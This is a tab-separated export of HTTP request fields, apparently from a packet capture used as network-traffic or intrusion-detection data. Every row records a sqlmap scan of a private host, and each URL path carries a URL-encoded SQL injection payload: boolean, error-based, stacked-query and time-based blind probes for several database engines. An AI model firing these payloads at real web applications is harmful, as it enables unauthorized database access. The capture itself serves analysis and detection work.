http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%20AND%204277%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284277%3D4277%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27liZN%27%3D%27liZN		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%20AND%204277%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284277%3D4277%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27liZN%27%3D%27liZN
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%20AND%204277%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284277%3D4277%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20qLkN		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%20AND%204277%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284277%3D4277%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20qLkN
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%29%20AND%201149%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281149%3D1149%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%20AND%20%284030%3D4030		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%29%20AND%201149%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281149%3D1149%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%20AND%20%284030%3D4030
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%20AND%201149%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281149%3D1149%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%20AND%201149%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281149%3D1149%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%29%20AND%201149%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281149%3D1149%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%20AND%20%28%27zOro%27%3D%27zOro		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%29%20AND%201149%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281149%3D1149%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%20AND%20%28%27zOro%27%3D%27zOro
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%20AND%201149%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281149%3D1149%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%20AND%20%27yTwr%27%3D%27yTwr		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%20AND%201149%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281149%3D1149%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%20AND%20%27yTwr%27%3D%27yTwr
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%20AND%201149%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281149%3D1149%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20nPsw		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%20AND%201149%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281149%3D1149%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20nPsw
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%29%20AND%209290%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289290%3D9290%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%282327%3D2327		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%29%20AND%209290%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289290%3D9290%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%282327%3D2327
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%20AND%209290%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289290%3D9290%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%20AND%209290%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289290%3D9290%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%29%20AND%209290%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289290%3D9290%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27pUda%27%3D%27pUda		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%29%20AND%209290%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289290%3D9290%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27pUda%27%3D%27pUda
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%20AND%209290%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289290%3D9290%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27jNQG%27%3D%27jNQG		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%20AND%209290%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289290%3D9290%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27jNQG%27%3D%27jNQG
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%20AND%209290%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289290%3D9290%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20Bqrf		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%20AND%209290%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289290%3D9290%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20Bqrf
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/%28SELECT%20CONCAT%28CONCAT%28%27qzxqq%27%2C%28CASE%20WHEN%20%287101%3D7101%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qzbjq%27%29%29		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/%28SELECT%20CONCAT%28CONCAT%28%27qzxqq%27%2C%28CASE%20WHEN%20%287101%3D7101%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qzbjq%27%29%29
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%29%3BSELECT%20PG_SLEEP%285%29--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%29%3BSELECT%20PG_SLEEP%285%29--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%3BSELECT%20PG_SLEEP%285%29--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%3BSELECT%20PG_SLEEP%285%29--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%29%3BSELECT%20PG_SLEEP%285%29--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%29%3BSELECT%20PG_SLEEP%285%29--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%3BSELECT%20PG_SLEEP%285%29--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%3BSELECT%20PG_SLEEP%285%29--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%3BSELECT%20PG_SLEEP%285%29--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%3BSELECT%20PG_SLEEP%285%29--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%3BSELECT%20PG_SLEEP%285%29--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%3BSELECT%20PG_SLEEP%285%29--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2886%29%7C%7CCHR%2882%29%7C%7CCHR%2898%29%2C5%29%20FROM%20DUAL--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2886%29%7C%7CCHR%2882%29%7C%7CCHR%2898%29%2C5%29%20FROM%20DUAL--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2886%29%7C%7CCHR%2882%29%7C%7CCHR%2898%29%2C5%29%20FROM%20DUAL--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2886%29%7C%7CCHR%2882%29%7C%7CCHR%2898%29%2C5%29%20FROM%20DUAL--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2886%29%7C%7CCHR%2882%29%7C%7CCHR%2898%29%2C5%29%20FROM%20DUAL--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2886%29%7C%7CCHR%2882%29%7C%7CCHR%2898%29%2C5%29%20FROM%20DUAL--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2886%29%7C%7CCHR%2882%29%7C%7CCHR%2898%29%2C5%29%20FROM%20DUAL--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2886%29%7C%7CCHR%2882%29%7C%7CCHR%2898%29%2C5%29%20FROM%20DUAL--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2886%29%7C%7CCHR%2882%29%7C%7CCHR%2898%29%2C5%29%20FROM%20DUAL--		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2886%29%7C%7CCHR%2882%29%7C%7CCHR%2898%29%2C5%29%20FROM%20DUAL--
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%29%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29%20AND%20%289253%3D9253		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%29%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29%20AND%20%289253%3D9253
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%29%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29%20AND%20%289253%3D9253		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%29%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29%20AND%20%289253%3D9253
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%29%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29%20AND%20%289253%3D9253		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%29%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29%20AND%20%289253%3D9253
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%29%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29%20AND%20%289253%3D9253		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%29%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29%20AND%20%289253%3D9253
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%280%29%29%29hPlB%29		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%280%29%29%29hPlB%29
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%29%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29%20AND%20%28%27JdTr%27%3D%27JdTr		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%29%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29%20AND%20%28%27JdTr%27%3D%27JdTr
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29%20AND%20%27LTUN%27%3D%27LTUN		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29%20AND%20%27LTUN%27%3D%27LTUN
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29--%20ejTC		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%20AND%20%28SELECT%205091%20FROM%20%28SELECT%28SLEEP%285%29%29%29hPlB%29--%20ejTC
